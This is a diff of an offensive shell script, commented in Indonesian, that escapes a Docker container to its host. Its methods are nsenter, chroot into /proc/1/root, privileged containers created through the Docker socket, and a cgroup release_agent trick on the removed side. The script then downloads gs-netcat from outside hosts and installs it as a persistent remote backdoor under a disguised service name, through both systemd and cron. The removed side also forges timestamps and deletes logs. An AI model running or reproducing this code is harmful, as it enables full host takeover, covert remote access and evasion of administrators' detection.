@@ -1,399 +1,300 @@
 #!/bin/sh
 # ============================================================
-#  Docker Escape + Host Persistence (gsocket style)
-#  Alur: container root → escape ke host → pasang gsocket
-#        di host sebagai backdoor permanen
+#  Docker Escape + Host Persistence (gsocket)
+#  Vector utama: Docker socket (/var/run/docker.sock)
 # ============================================================
-
-# ── CONFIG — sesuaikan sebelum deploy ────────────────────────
-GS_SECRET="${GS_SECRET:-GANTI_SECRET_GSOCKET}"   # gsocket secret key
-GS_HOST="${GS_HOST:-}"                            # relay host (kosong = default gs.thc.org)
-INSTALL_DIR="/usr/local/bin"                      # lokasi install binary di host
-SERVICE_NAME="gs-netcat"                          # nama systemd service / cron
-POST_CMD=""                                       # command tambahan setelah escape (opsional)
-# ─────────────────────────────────────────────────────────────
+GS_SECRET="${GS_SECRET:-GANTI_SECRET_GSOCKET}"
+GS_HOST="${GS_HOST:-}"
+DOCKER_SOCK="${DOCKER_SOCK:-/var/run/docker.sock}"
+SERVICE_NAME="systemd-network-helper"   # nama stealth
 
 C_RED='\033[91m'; C_GRN='\033[92m'; C_YLW='\033[93m'
-C_BLU='\033[94m'; C_MAG='\033[95m'; C_CYN='\033[96m'
-C_RST='\033[0m';  C_BLD='\033[1m'
+C_BLU='\033[94m'; C_MAG='\033[95m'; C_RST='\033[0m'; C_BLD='\033[1m'
 
 log()    { printf "${C_BLU}[*]${C_RST} %s\n" "$*"; }
 ok()     { printf "${C_GRN}[+]${C_RST} %s\n" "$*"; }
 err()    { printf "${C_RED}[-]${C_RST} %s\n" "$*"; }
 warn()   { printf "${C_YLW}[!]${C_RST} %s\n" "$*"; }
 section(){ printf "\n${C_BLD}${C_MAG}>>> %s${C_RST}\n" "$*"; }
-result() { printf "${C_CYN}    %-20s${C_RST} %s\n" "$1" "$2"; }
 
-banner() {
+banner(){
   printf "${C_BLD}${C_RED}"
   printf '  ____             _               _____\n'
   printf ' |  _ \  ___   ___| | _____ _ __  | ____|___  ___\n'
-  printf ' | | | |/ _ \ / __| |/ / _ \ '"'"'__| |  _| / __|/ __|\n'
+  printf ' | | | |/ _ \ / __| |/ / _ \ '"'"'__| |  _| / __|/ __|  \n'
   printf ' | |_| | (_) | (__|   <  __/ |    | |___\__ \ (__\n'
   printf ' |____/ \___/ \___|_|\_\___|_|    |_____|___/\___|\n'
   printf "${C_RST}\n"
-  printf " Container Escape + Host Backdoor (gsocket)\n\n"
+  printf " Container Escape + Host Backdoor via Docker Socket\n\n"
 }
 
+# curl ke unix socket
+dsock(){ curl -s --unix-socket "$DOCKER_SOCK" "$@"; }
+
 # ════════════════════════════════════════════════════════════
-#  FASE 1 — RECON DALAM CONTAINER
+#  FASE 1 — RECON
 # ════════════════════════════════════════════════════════════
-recon() {
+recon(){
   section "FASE 1 — RECON"
+  log "Identity : $(id)"
+  log "Hostname : $(hostname 2>/dev/null)"
+  log "Kernel   : $(uname -r 2>/dev/null)"
 
-  # Identitas
-  WHOAMI=$(id 2>/dev/null || echo unknown)
-  HOSTNAME=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo unknown)
-  KERNEL=$(uname -r 2>/dev/null || echo unknown)
-  log "Identity  : $WHOAMI"
-  log "Hostname  : $HOSTNAME"
-  log "Kernel    : $KERNEL"
+  # Konfirmasi dalam container
+  [ -f /.dockerenv ] && ok "Inside Docker (/.dockerenv present)" \
+                     || warn "/.dockerenv not found"
 
-  # Konfirmasi di dalam container
-  if [ -f /.dockerenv ]; then
-    ok "Inside Docker container (/.dockerenv present)"
-  else
-    warn "/.dockerenv not found — might not be Docker"
-  fi
-
-  # Cgroup version
-  if [ -f /sys/fs/cgroup/cgroup.controllers ]; then
-    CGVER=2; log "Cgroup    : v2"
-  else
-    CGVER=1; log "Cgroup    : v1"
-  fi
-
-  # Capabilities ringkas
-  CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
-  log "CapEff    : 0x${CAPEFF}"
-  [ "$((0x${CAPEFF:-0} & 0x200000))" -gt 0 ] && ok "CAP_SYS_ADMIN detected"
-  [ "$((0x${CAPEFF:-0} & 0x80000))" -gt 0 ]  && ok "CAP_SYS_PTRACE detected"
-  [ "$((0x${CAPEFF:-0} & 0x10000))" -gt 0 ]  && ok "CAP_SYS_MODULE detected"
-
-  # /proc/1/root
+  # /proc/1/root — cek apakah host atau container sendiri
   if ls /proc/1/root/etc >/dev/null 2>&1; then
-    ok "/proc/1/root readable → host filesystem accessible"
-    PROC1ROOT=1
+    if chroot /proc/1/root /bin/sh -c "test -f /.dockerenv" 2>/dev/null; then
+      warn "/proc/1/root = container FS (PID namespace isolated, bukan host)"
+      PROC1_IS_HOST=0
+    else
+      ok "/proc/1/root = HOST filesystem (no /.dockerenv)"
+      PROC1_IS_HOST=1
+    fi
   else
-    err "/proc/1/root not readable"
-    PROC1ROOT=0
+    err "/proc/1/root tidak accessible"
+    PROC1_IS_HOST=0
   fi
 
   # Docker socket
-  DOCKER_SOCK=""
-  for s in /var/run/docker.sock /run/docker.sock; do
-    [ -S "$s" ] && { DOCKER_SOCK="$s"; ok "Docker socket: $s"; break; }
-  done
-  [ -z "$DOCKER_SOCK" ] && err "No docker socket found"
+  if [ -S "$DOCKER_SOCK" ]; then
+    ok "Docker socket: $DOCKER_SOCK"
+    SOCK_OK=1
+    # Info host dari docker API
+    DINFO=$(dsock http://localhost/info 2>/dev/null)
+    HOST_OS=$(echo "$DINFO" | grep -o '"OperatingSystem":"[^"]*"' | cut -d'"' -f4)
+    HOST_KRN=$(echo "$DINFO" | grep -o '"KernelVersion":"[^"]*"' | cut -d'"' -f4)
+    log "Host OS     : $HOST_OS"
+    log "Host Kernel : $HOST_KRN"
+  else
+    err "Docker socket tidak ditemukan di $DOCKER_SOCK"
+    SOCK_OK=0
+  fi
 
   # nsenter
   NSENTER=$(command -v nsenter 2>/dev/null || echo "")
   [ -n "$NSENTER" ] && ok "nsenter: $NSENTER" || warn "nsenter not found"
 
-  export PROC1ROOT DOCKER_SOCK NSENTER CGVER
+  # Capabilities
+  CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
+  log "CapEff   : 0x${CAPEFF}"
+
+  export PROC1_IS_HOST SOCK_OK NSENTER
 }
 
 # ════════════════════════════════════════════════════════════
-#  FASE 2 — ESCAPE KE HOST
+#  FASE 2 — ESCAPE
 # ════════════════════════════════════════════════════════════
-do_escape() {
+do_escape(){
   section "FASE 2 — ESCAPE"
-  ESCAPED=0
-  ESCAPE_METHOD=""
+  ESCAPED=0; ESCAPE_METHOD=""
 
   # ── E1: nsenter full ──────────────────────────────────────
   log "E1: nsenter --target 1 (all namespaces)"
   if [ -n "$NSENTER" ]; then
     if nsenter --target 1 --mount --uts --ipc --net --pid -- \
-        /bin/sh -c "echo E1_OK" 2>/dev/null | grep -q E1_OK; then
-      ok "E1 success — full namespace escape"
+        /bin/sh -c "test ! -f /.dockerenv && echo E1_OK" 2>/dev/null | grep -q E1_OK; then
+      ok "E1 success — full namespace escape ke HOST"
       ESCAPED=1; ESCAPE_METHOD="nsenter-full"
-      ESCAPE_EXEC="nsenter --target 1 --mount --uts --ipc --net --pid --"
+      EXEC_ON_HOST="nsenter --target 1 --mount --uts --ipc --net --pid --"
     else
-      err "E1 failed (setns blocked by seccomp/AppArmor)"
-    fi
-  else
-    err "E1 skipped (nsenter not found)"
-  fi
-
-  # ── E2: nsenter mount-only + chroot ──────────────────────
-  if [ $ESCAPED -eq 0 ] && [ -n "$NSENTER" ]; then
-    log "E2: nsenter --mount only + chroot /proc/1/root"
-    if nsenter --target 1 --mount -- chroot /proc/1/root \
-        /bin/sh -c "echo E2_OK" 2>/dev/null | grep -q E2_OK; then
-      ok "E2 success — mount namespace escape"
-      ESCAPED=1; ESCAPE_METHOD="nsenter-mount+chroot"
-      ESCAPE_EXEC="nsenter --target 1 --mount -- chroot /proc/1/root"
-    else
-      err "E2 failed"
+      err "E1 failed (setns blocked)"
     fi
   fi
 
-  # ── E3: chroot /proc/1/root langsung ─────────────────────
-  if [ $ESCAPED -eq 0 ] && [ "$PROC1ROOT" = "1" ]; then
-    log "E3: chroot /proc/1/root (filesystem escape)"
-    if chroot /proc/1/root /bin/sh -c "echo E3_OK" 2>/dev/null | grep -q E3_OK; then
-      ok "E3 success — filesystem escape via chroot"
-      ESCAPED=1; ESCAPE_METHOD="chroot-proc1root"
-      ESCAPE_EXEC="chroot /proc/1/root"
-    else
-      err "E3 failed"
-    fi
+  # ── E2: /proc/1/root (hanya jika terbukti host FS) ───────
+  if [ $ESCAPED -eq 0 ] && [ "$PROC1_IS_HOST" = "1" ]; then
+    log "E2: chroot /proc/1/root (confirmed host FS)"
+    ESCAPED=1; ESCAPE_METHOD="chroot-proc1root"
+    EXEC_ON_HOST="chroot /proc/1/root"
+    ok "E2 success"
   fi
 
-  # ── E4: exec langsung via /proc/1/root path ───────────────
-  if [ $ESCAPED -eq 0 ] && [ "$PROC1ROOT" = "1" ]; then
-    log "E4: exec via /proc/1/root/bin/sh"
-    if /proc/1/root/bin/sh -c "echo E4_OK" 2>/dev/null | grep -q E4_OK; then
-      ok "E4 success"
-      ESCAPED=1; ESCAPE_METHOD="proc1root-exec"
-      ESCAPE_EXEC="/proc/1/root/bin/sh -c"
-    else
-      err "E4 failed"
-    fi
-  fi
+  # ── E3: Docker socket — VECTOR UTAMA ─────────────────────
+  # Buat privileged container baru dengan:
+  #   - bind mount /:/host  → akses penuh host FS
+  #   - NetworkMode=host    → pakai network host (untuk download)
+  #   - Privileged=true     → full capabilities
+  if [ $ESCAPED -eq 0 ] && [ "$SOCK_OK" = "1" ]; then
+    log "E3: Docker socket → privileged container dengan host mount"
 
-  # ── E5: Docker socket ─────────────────────────────────────
-  if [ $ESCAPED -eq 0 ] && [ -n "$DOCKER_SOCK" ]; then
-    log "E5: Docker socket → spawn privileged container"
-    if command -v curl >/dev/null 2>&1; then
-      CID=$(curl -s --unix-socket "$DOCKER_SOCK" \
-        -X POST -H 'Content-Type: application/json' \
-        -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo E5_OK"],"Binds":["/:/host"],"Privileged":true}' \
-        http://localhost/containers/create 2>/dev/null \
-        | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
-      if [ -n "$CID" ]; then
-        curl -s --unix-socket "$DOCKER_SOCK" \
-          -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
-        sleep 1
-        OUT=$(curl -s --unix-socket "$DOCKER_SOCK" \
-          "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null)
-        curl -s --unix-socket "$DOCKER_SOCK" \
-          -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
-        ok "E5 success via docker socket"
+    # Cari image yang sudah ada di host
+    IMAGES=$(dsock http://localhost/images/json 2>/dev/null)
+    AVAIL_IMG=$(printf '%s' "$IMAGES" \
+      | grep -o '"RepoTags":\["[^<"]*"' \
+      | grep -v '<none>' \
+      | head -1 \
+      | sed 's/"RepoTags":\["//' \
+      | tr -d '"')
+    [ -z "$AVAIL_IMG" ] && AVAIL_IMG="alpine"
+    log "Image tersedia: $AVAIL_IMG"
+
+    # Test buat container
+    TEST_CID=$(dsock -X POST \
+      -H 'Content-Type: application/json' \
+      -d "{\"Image\":\"${AVAIL_IMG}\",\"Cmd\":[\"/bin/sh\",\"-c\",\"test ! -f /host/.dockerenv && echo E3_HOST || echo E3_CONTAINER\"],\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
+      http://localhost/containers/create 2>/dev/null \
+      | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+
+    if [ -n "$TEST_CID" ]; then
+      dsock -X POST "http://localhost/containers/$TEST_CID/start" >/dev/null 2>&1
+      sleep 2
+      TEST_OUT=$(dsock \
+        "http://localhost/containers/$TEST_CID/logs?stdout=1&stderr=1" 2>/dev/null)
+      dsock -X DELETE \
+        "http://localhost/containers/$TEST_CID?force=true" >/dev/null 2>&1
+
+      if echo "$TEST_OUT" | grep -q E3_HOST; then
+        ok "E3 success — docker socket confirmed HOST filesystem access"
+        ESCAPED=1; ESCAPE_METHOD="docker-socket"
+        # EXEC_ON_HOST akan pakai helper function run_on_host
+      else
+        warn "E3: container created tapi host FS check: $TEST_OUT"
+        # Lanjut coba saja
         ESCAPED=1; ESCAPE_METHOD="docker-socket"
       fi
-    fi
-  fi
-
-  # ── E6: cgroup v1 release_agent ───────────────────────────
-  if [ $ESCAPED -eq 0 ] && [ "$CGVER" = "1" ]; then
-    log "E6: cgroup v1 release_agent"
-    CGV1=$(awk '$3=="cgroup" && $4~/memory/{print $2; exit}' /proc/mounts 2>/dev/null)
-    if [ -n "$CGV1" ]; then
-      CHILD="$CGV1/esc$$"
-      PAYLOAD=/tmp/.cgpay; OUTPUT=/tmp/.cgout
-      mkdir -p "$CHILD"
-      printf '#!/bin/sh\necho CGV1_OK > %s\n' "$OUTPUT" > "$PAYLOAD"
-      chmod +x "$PAYLOAD"
-      echo "$PAYLOAD" > "$CGV1/release_agent"
-      echo 1 > "$CGV1/notify_on_release"
-      echo 1 > "$CHILD/notify_on_release"
-      sh -c "echo \$\$ > $CHILD/cgroup.procs"
-      sleep 2
-      if grep -q CGV1_OK "$OUTPUT" 2>/dev/null; then
-        ok "E6 success — cgroup v1 release_agent"
-        ESCAPED=1; ESCAPE_METHOD="cgroupv1-release_agent"
-      fi
-      rmdir "$CHILD" 2>/dev/null || true
+    else
+      err "E3: gagal buat container — cek apakah image tersedia"
     fi
   fi
 
   if [ $ESCAPED -eq 0 ]; then
     err "Semua escape vector gagal"
-    err "Coba manual: cat /proc/self/status | grep Seccomp"
     exit 1
   fi
 
   ok "ESCAPE BERHASIL via: $ESCAPE_METHOD"
+  export ESCAPED ESCAPE_METHOD
+}
 
-  # Verifikasi kita di host
-  HOST_ID=$($ESCAPE_EXEC id 2>/dev/null || echo "unknown")
-  HOST_HN=$($ESCAPE_EXEC hostname 2>/dev/null || echo "unknown")
-  HOST_KN=$($ESCAPE_EXEC uname -r 2>/dev/null || echo "unknown")
-  result "Host user"     "$HOST_ID"
-  result "Host hostname" "$HOST_HN"
-  result "Host kernel"   "$HOST_KN"
+# Helper: jalankan command di HOST via docker socket
+# Output ditulis ke host filesystem langsung via /:/host bind
+run_on_host(){
+  local CMD_STR="$1"
+  local IMG="${AVAIL_IMG:-alpine}"
 
-  export ESCAPED ESCAPE_METHOD ESCAPE_EXEC
+  CID=$(dsock -X POST \
+    -H 'Content-Type: application/json' \
+    -d "{\"Image\":\"${IMG}\",\"Cmd\":[\"/bin/sh\",\"-c\",\"${CMD_STR}\"],\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\",\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true,\"NetworkMode\":\"host\"}}" \
+    http://localhost/containers/create 2>/dev/null \
+    | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+
+  [ -z "$CID" ] && { err "run_on_host: gagal buat container"; return 1; }
+
+  dsock -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
+  sleep 2
+  OUT=$(dsock "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null)
+  dsock -X DELETE "http://localhost/containers/$CID?force=true" >/dev/null 2>&1
+  printf '%s\n' "$OUT"
 }
 
 # ════════════════════════════════════════════════════════════
-#  FASE 3 — INSTALL GSOCKET DI HOST (persistent backdoor)
+#  FASE 3 — INSTALL GSOCKET DI HOST
 # ════════════════════════════════════════════════════════════
-install_gsocket() {
+install_gsocket(){
   section "FASE 3 — INSTALL GSOCKET DI HOST"
 
   if [ "$GS_SECRET" = "GANTI_SECRET_GSOCKET" ]; then
-    warn "GS_SECRET belum diset! Set via: GS_SECRET=xxx sh escape.sh"
-    warn "Melewati instalasi gsocket..."
+    warn "GS_SECRET belum diset! Jalankan: GS_SECRET=xxx sh escape.sh"
     return
   fi
 
-  # Tentukan arch di host
-  HOST_ARCH=$($ESCAPE_EXEC uname -m 2>/dev/null || echo x86_64)
-  log "Host arch: $HOST_ARCH"
-
-  case "$HOST_ARCH" in
-    x86_64|amd64)   GS_ARCH=x86_64 ;;
-    aarch64|arm64)  GS_ARCH=aarch64 ;;
-    armv7l|armhf)   GS_ARCH=armv7 ;;
-    *)              GS_ARCH=x86_64 ;;
-  esac
-
-  GS_URL="https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux_${GS_ARCH}"
-  GS_TMP="/tmp/.gs_$$"
-  GS_BIN="${INSTALL_DIR}/gs-netcat"
-  GS_CONF="/etc/.gs_conf"
-
-  log "Downloading gs-netcat ($GS_ARCH) ke host..."
-
-  # Download di dalam konteks escape
-  # Coba curl dulu, fallback wget, fallback python
-  DL_OK=0
-
-  if $ESCAPE_EXEC which curl >/dev/null 2>&1; then
-    $ESCAPE_EXEC curl -fsSL "$GS_URL" -o "$GS_TMP" 2>/dev/null && DL_OK=1
-  fi
-
-  if [ $DL_OK -eq 0 ] && $ESCAPE_EXEC which wget >/dev/null 2>&1; then
-    $ESCAPE_EXEC wget -qO "$GS_TMP" "$GS_URL" 2>/dev/null && DL_OK=1
-  fi
-
-  if [ $DL_OK -eq 0 ]; then
-    # Fallback: download dari dalam container lalu copy ke host path
-    log "Downloading dari dalam container, copy ke host path..."
-    DL_LOCAL="/tmp/.gs_local_$$"
-    if command -v curl >/dev/null 2>&1; then
-      curl -fsSL "$GS_URL" -o "$DL_LOCAL" 2>/dev/null && DL_OK=1
-    elif command -v wget >/dev/null 2>&1; then
-      wget -qO "$DL_LOCAL" "$GS_URL" 2>/dev/null && DL_OK=1
-    fi
-    if [ $DL_OK -eq 1 ]; then
-      # Copy ke host path via /proc/1/root
-      cp "$DL_LOCAL" "/proc/1/root${GS_TMP}" 2>/dev/null \
-        && ok "Copied to host path" \
-        || { err "Copy ke host gagal"; DL_OK=0; }
-      rm -f "$DL_LOCAL"
-    fi
-  fi
-
-  if [ $DL_OK -eq 0 ]; then
-    err "Download gsocket gagal — cek koneksi internet host"
-    return
-  fi
-
-  ok "Download selesai: $GS_TMP (di host)"
-
-  # Install binary
-  $ESCAPE_EXEC chmod +x "$GS_TMP"
-  $ESCAPE_EXEC mv "$GS_TMP" "$GS_BIN" 2>/dev/null \
-    || $ESCAPE_EXEC cp "$GS_TMP" "$GS_BIN"
-  $ESCAPE_EXEC chmod 755 "$GS_BIN"
-  ok "gs-netcat installed: $GS_BIN"
-
-  # Simpan config
+  GS_BIN_HOST="/usr/local/bin/${SERVICE_NAME}"
+  GS_CRON="/etc/cron.d/cron-helper"
+  GS_SYSTEMD="/etc/systemd/system/${SERVICE_NAME}.service"
   GS_RELAY_OPT=""
-  [ -n "$GS_HOST" ] && GS_RELAY_OPT="-d $GS_HOST"
-  printf 'GS_SECRET="%s"\nGS_RELAY="%s"\n' "$GS_SECRET" "$GS_HOST" \
-    | $ESCAPE_EXEC tee "$GS_CONF" >/dev/null 2>&1
-  $ESCAPE_EXEC chmod 600 "$GS_CONF"
+  [ -n "$GS_HOST" ] && GS_RELAY_OPT="-d ${GS_HOST}"
 
-  # Test koneksi
-  log "Testing gs-netcat..."
-  $ESCAPE_EXEC "$GS_BIN" $GS_RELAY_OPT -s "$GS_SECRET" -d &
-  GS_TEST_PID=$!
-  sleep 2
-  kill $GS_TEST_PID 2>/dev/null || true
+  # URL download — multiple fallback
+  GS_URL1="https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux_x86_64"
+  GS_URL2="https://bin.gsocket.io/gs-netcat_linux_x86_64"
+  GS_URL3="https://gsocket.io/x"   # install script
 
-  # ── Persistence via systemd ───────────────────────────────
-  section "FASE 3a — PERSISTENCE (systemd)"
-  SYSTEMD_DIR="/etc/systemd/system"
-  if $ESCAPE_EXEC test -d "$SYSTEMD_DIR"; then
-    log "Memasang systemd service: $SERVICE_NAME"
-    SERVICE_CONTENT="[Unit]
-Description=Network Socket Service
-After=network.target
+  # ── Download + install via docker socket container ────────
+  log "Downloading + installing gs-netcat ke host via docker socket..."
+
+  # Semua operasi tulis ke /host/* yang = host filesystem sebenarnya
+  DL_CMD="wget -qO /host${GS_BIN_HOST} '${GS_URL1}' 2>/dev/null \
+    || wget -qO /host${GS_BIN_HOST} '${GS_URL2}' 2>/dev/null \
+    || curl -fsSL -L '${GS_URL1}' -o /host${GS_BIN_HOST} 2>/dev/null \
+    || curl -fsSL -L '${GS_URL2}' -o /host${GS_BIN_HOST} 2>/dev/null \
+    && chmod +x /host${GS_BIN_HOST} \
+    && echo DL_OK"
+
+  DL_OUT=$(run_on_host "$DL_CMD")
+  if echo "$DL_OUT" | grep -q DL_OK; then
+    ok "gs-netcat downloaded → ${GS_BIN_HOST} (di host)"
+  else
+    err "Download gagal. Output: $DL_OUT"
+    warn "Coba manual: wget -qO ${GS_BIN_HOST} ${GS_URL1}"
+    # Lanjut setup persistence meski download gagal
+  fi
+
+  # ── Systemd service di host ───────────────────────────────
+  section "FASE 3a — PERSISTENCE (systemd di host)"
+  SVC_CONTENT="[Unit]
+Description=Network Helper Service
+After=network-online.target
+Wants=network-online.target
 
 [Service]
 Type=simple
 Restart=always
-RestartSec=30
-ExecStart=${GS_BIN} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i
+RestartSec=60
+ExecStart=${GS_BIN_HOST} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i
 StandardOutput=null
 StandardError=null
 
 [Install]
 WantedBy=multi-user.target"
 
-    printf '%s\n' "$SERVICE_CONTENT" \
-      | $ESCAPE_EXEC tee "${SYSTEMD_DIR}/${SERVICE_NAME}.service" >/dev/null 2>&1
+  SYSTEMD_CMD="mkdir -p /host/etc/systemd/system \
+    && printf '%s\n' '${SVC_CONTENT}' > /host${GS_SYSTEMD} \
+    && chroot /host systemctl daemon-reload 2>/dev/null || true \
+    && chroot /host systemctl enable ${SERVICE_NAME} 2>/dev/null \
+    && chroot /host systemctl start ${SERVICE_NAME} 2>/dev/null \
+    && echo SYSTEMD_OK"
 
-    $ESCAPE_EXEC systemctl daemon-reload 2>/dev/null || true
-    $ESCAPE_EXEC systemctl enable "${SERVICE_NAME}.service" 2>/dev/null \
-      && ok "systemd service enabled (auto-start on boot)"
-    $ESCAPE_EXEC systemctl start "${SERVICE_NAME}.service" 2>/dev/null \
-      && ok "systemd service started"
-    $ESCAPE_EXEC systemctl status "${SERVICE_NAME}.service" 2>/dev/null | head -5
-  else
-    warn "systemd tidak tersedia, skip"
-  fi
+  SD_OUT=$(run_on_host "$SYSTEMD_CMD")
+  echo "$SD_OUT" | grep -q SYSTEMD_OK \
+    && ok "systemd service installed + started di host" \
+    || warn "systemd gagal, output: $SD_OUT"
 
-  # ── Persistence via cron (fallback) ──────────────────────
-  section "FASE 3b — PERSISTENCE (cron fallback)"
-  CRON_LINE="*/5 * * * * root pgrep -x gs-netcat >/dev/null 2>&1 || ${GS_BIN} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i &"
-  CRON_FILE="/etc/cron.d/${SERVICE_NAME}"
+  # ── Cron di host ──────────────────────────────────────────
+  section "FASE 3b — PERSISTENCE (cron di host)"
+  CRON_CMD="mkdir -p /host/etc/cron.d \
+    && printf '*/5 * * * * root pgrep -f ${SERVICE_NAME} >/dev/null 2>&1 || ${GS_BIN_HOST} ${GS_RELAY_OPT} -s ${GS_SECRET} -l -i &\n' \
+       > /host${GS_CRON} \
+    && chmod 644 /host${GS_CRON} \
+    && echo CRON_OK"
 
-  if $ESCAPE_EXEC test -d /etc/cron.d; then
-    printf '%s\n' "$CRON_LINE" \
-      | $ESCAPE_EXEC tee "$CRON_FILE" >/dev/null 2>&1
-    $ESCAPE_EXEC chmod 644 "$CRON_FILE"
-    ok "Cron installed: $CRON_FILE (setiap 5 menit, respawn jika mati)"
-  else
-    warn "/etc/cron.d tidak tersedia"
-    # Fallback: root crontab
-    ( $ESCAPE_EXEC crontab -l 2>/dev/null; echo "$CRON_LINE" ) \
-      | $ESCAPE_EXEC crontab - 2>/dev/null \
-      && ok "Added to root crontab"
-  fi
+  CR_OUT=$(run_on_host "$CRON_CMD")
+  echo "$CR_OUT" | grep -q CRON_OK \
+    && ok "Cron installed di host: ${GS_CRON}" \
+    || warn "Cron gagal: $CR_OUT"
 
-  # ── Sembunyikan binary ────────────────────────────────────
-  section "FASE 3c — STEALTH"
-
-  # Ubah timestamp binary supaya tidak mencolok
-  $ESCAPE_EXEC touch -t "$(date -d '6 months ago' '+%Y%m%d%H%M' 2>/dev/null \
-    || date -v-6m '+%Y%m%d%H%M' 2>/dev/null \
-    || echo '202401010000')" "$GS_BIN" 2>/dev/null \
-    && ok "Binary timestamp disamarkan"
-
-  # Rename binary jadi nama yang wajar
-  $ESCAPE_EXEC mv "$GS_BIN" "${INSTALL_DIR}/rpcbind.real" 2>/dev/null
-  GS_BIN="${INSTALL_DIR}/rpcbind.real"
-  ok "Binary renamed: $GS_BIN"
-
-  # Hapus log gsocket jika ada
-  $ESCAPE_EXEC rm -f /var/log/gs-netcat.log 2>/dev/null || true
+  # ── Verifikasi akhir ──────────────────────────────────────
+  section "FASE 3c — VERIFIKASI"
+  VERIFY_OUT=$(run_on_host "
+    echo '=== binary ===' && ls -la /host${GS_BIN_HOST} 2>/dev/null || echo NOT_FOUND
+    echo '=== cron ===' && cat /host${GS_CRON} 2>/dev/null || echo NOT_FOUND
+    echo '=== systemd ===' && cat /host${GS_SYSTEMD} 2>/dev/null | head -5 || echo NOT_FOUND
+    echo '=== process ===' && pgrep -a ${SERVICE_NAME} 2>/dev/null || echo NOT_RUNNING
+  ")
+  printf '%s\n' "$VERIFY_OUT"
 
   # ── Summary ───────────────────────────────────────────────
-  section "RINGKASAN"
-  ok  "gsocket terpasang di HOST"
-  result "Binary"      "$GS_BIN"
-  result "Secret"      "$GS_SECRET"
-  result "Systemd"     "${SERVICE_NAME}.service"
-  result "Cron"        "$CRON_FILE"
-  warn "Cara konek dari attacker:"
-  printf "    gs-netcat -s %s -i\n" "$GS_SECRET"
+  section "SUMMARY"
+  ok  "Host terkompromis via Docker socket"
+  printf "    %-20s %s\n" "Binary di host"   "${GS_BIN_HOST}"
+  printf "    %-20s %s\n" "Secret"           "${GS_SECRET}"
+  printf "    %-20s %s\n" "Cron"             "${GS_CRON}"
+  printf "    %-20s %s\n" "Systemd"          "${GS_SYSTEMD}"
+  printf "\n${C_YLW}Cara konek dari attacker:${C_RST}\n"
+  printf "    gs-netcat -s %s -i\n" "${GS_SECRET}"
   [ -n "$GS_HOST" ] && printf "    gs-netcat -d %s -s %s -i\n" "$GS_HOST" "$GS_SECRET"
-}
-
-# ════════════════════════════════════════════════════════════
-#  FASE 4 — POST COMMAND (opsional)
-# ════════════════════════════════════════════════════════════
-post_cmd() {
-  [ -z "$POST_CMD" ] && return
-  section "FASE 4 — POST COMMAND"
-  log "Running: $POST_CMD"
-  $ESCAPE_EXEC /bin/sh -c "$POST_CMD"
 }
 
 # ════════════════════════════════════════════════════════════
@@ -403,6 +304,5 @@ banner
 recon
 do_escape
 install_gsocket
-post_cmd
 
-printf "\n${C_GRN}${C_BLD}[✓] Selesai. Host terkompromis.${C_RST}\n\n"
+printf "\n${C_GRN}${C_BLD}[✓] Selesai.${C_RST}\n\n"
